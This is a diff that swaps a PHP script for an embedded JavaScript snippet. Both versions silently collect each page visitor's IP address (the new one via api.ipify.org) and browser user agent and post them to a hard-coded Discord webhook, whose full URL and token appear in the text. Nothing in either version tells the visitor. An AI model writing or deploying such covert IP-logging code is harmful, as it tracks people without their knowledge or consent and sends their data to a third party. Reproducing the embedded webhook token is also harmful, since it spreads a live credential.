@@ -1,23 +1,25 @@
-<?php
-$webhook = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H";
 
-$ip = $_SERVER['REMOTE_ADDR'];
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // your webhook
 
-$data = [
-    "content" => "Visitor IP: $ip\nUser Agent: $userAgent"
-];
+  const userAgent = navigator.userAgent; // gets browser/OS info
 
-$options = [
-    "http" => [
-        "header"  => "Content-Type: application/json\r\n",
-        "method"  => "POST",
-        "content" => json_encode($data),
-    ]
-];
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
 
-$context  = stream_context_create($options);
-$result = file_get_contents($webhook, false, $context);
-
-echo "Thanks for visiting!";
-?>
+      return fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `New visitor:\nIP: ${ip}\nUser-Agent: ${userAgent}`
+        })
+      });
+    })
+    .catch(err => {
+      console.error("Error:", err);
+    });
+</script>
